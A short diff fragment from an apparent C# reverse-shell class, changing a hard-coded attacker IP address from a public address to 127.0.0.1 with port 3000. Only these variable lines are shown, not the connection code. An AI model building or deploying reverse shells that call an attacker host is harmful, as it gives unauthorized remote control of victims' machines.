@@ -234,7 +234,7 @@ class ReverseShell
         b();
         a();
 
-        string attackerIP = "86.92.186.238";
+        string attackerIP = "127.0.0.1";
         int attackerPort = 3000;
 
         try
